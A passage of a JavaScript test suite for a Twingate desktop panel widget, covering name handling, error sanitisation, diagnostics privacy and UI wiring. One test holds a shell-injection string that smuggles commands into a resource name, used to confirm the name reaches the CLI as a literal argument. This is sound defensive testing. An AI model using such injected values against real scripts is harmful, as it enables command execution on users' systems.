  assert.equal(invisible[0].exactName, false, "a name that lost a character was treated as exact")
  const long = Model.parseResources("x".repeat(5000) + "\t10.0.0.1\t-\tNot authenticated")
  assert.equal(long[0].exactName, false, "a clamped name was treated as exact")
  assert.equal(renderAuthScript("Billing", { resource: { exactName: false } }).script, null,
    "authentication was launched with a name the CLI does not know")
  assert.ok(/resource\.exactName === true/.test(PANEL), "the button ignores exactName")
})

test("a status poll cannot release the switch while an action is still running", () => {
  const handler = SERVICE.slice(SERVICE.indexOf("id: statusProcess"))
  const body = handler.slice(0, handler.indexOf("\n  }"))
  assert.ok(/root\.actionPending && !actionProcess\.running && next !== root\._stateAtAction/.test(body),
    "the polkit prompt can still be open when the state first moves")
})

test("actionError is only ever a literal or a sanitised value", () => {
  const sanitisedVars = new Set(
    [...SERVICE.matchAll(/var (\w+) = Model\.clampField\(Model\.stripControl\(/g)].map(m => m[1]))
  const assigns = SERVICE.match(/actionError\s*=(?!=)\s*[^\n]*/g) || []
  assert.ok(assigns.length >= 2, "no actionError assignments found; guard is vacuous")
  for (const a of assigns) {
    // A fixed string we wrote, empty or not -- refusals are fixed sentences.
    const literal = /=\s*"[^"]*"\s*$/.test(a)
    const viaVar = (a.match(/=\s*(\w+)\s*$/) || [])[1]
    assert.ok(literal || (viaVar && sanitisedVars.has(viaVar)), `unsanitised actionError assignment: ${a.trim()}`)
  }
})

test("authenticating a resource quotes its tenant-controlled name", () => {
  const cp = require("node:child_process"), os = require("node:os")
  const hostile = "-x db'; touch PWNED; echo '$(touch PWNED2) `touch PWNED3`"
  const { result, script, tracksState } = renderAuthScript(hostile)
  assert.equal(result, true)
  assert.equal(tracksState, false, "authenticating one resource held the switch busy")
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "tw-auth-"))
  fs.writeFileSync(path.join(dir, "twingate"), '#!/bin/bash\nprintf "%s\\0" "$@" > "$TW_ARGS"\n')
  fs.chmodSync(path.join(dir, "twingate"), 0o755)
  const out = path.join(dir, "args")
  const r = cp.spawnSync("bash", ["-c", script.replace("PATH=/usr/bin:/bin", "PATH=" + dir + ":/usr/bin:/bin")],
    { cwd: dir, env: { ...process.env, TW_ARGS: out }, encoding: "utf8", timeout: 10000 })
  const received = fs.existsSync(out) ? fs.readFileSync(out, "utf8").split("\0").slice(0, -1) : null
  const executed = ["PWNED", "PWNED2", "PWNED3"].filter(f => fs.existsSync(path.join(dir, f)))
  fs.rmSync(dir, { recursive: true, force: true })
  assert.equal(r.status, 0, r.stderr)
  assert.deepEqual(received, ["auth", "--", hostile], "the CLI did not receive the name as one literal argument")
  assert.deepEqual(executed, [], "part of the name was executed")
})

test("only a locked resource on a connected client is offered authentication", () => {
  assert.equal(renderAuthScript("web", { resource: { authStatus: "Auth expires in 4 days" } }).script, null)
  assert.equal(renderAuthScript("web", { connected: false }).script, null)
  assert.equal(renderAuthScript("").script, null)
})

test("diagnostics never includes the account address", () => {
  const body = extractFunction("diagnosticsJson")
  assert.ok(/signedIn:/.test(body), "diagnostics does not say whether an account is signed in")
  assert.ok(!/accountEmail|accountNetwork/.test(body), "diagnostics output would leak the account")
})

test("the panel wires its new controls to the service", () => {
  assert.ok(/onClicked:\s*twingate\.signOut\(\)/.test(PANEL), "Sign out is not wired")
  assert.ok(/onAuthenticate:\s*twingate\.authenticateResource\(modelData\)/.test(PANEL), "Authenticate is not wired")
  assert.ok(/Model\.filterResources\(twingate\.resources, searchText\)/.test(PANEL), "search does not filter")
  assert.ok(/model:\s*root\.visibleResources/.test(PANEL), "the list does not render the filtered rows")
  assert.ok(/blocked:\s*searchField\.activeFocus/.test(PANEL), "typing in search would fire panel shortcuts")
})
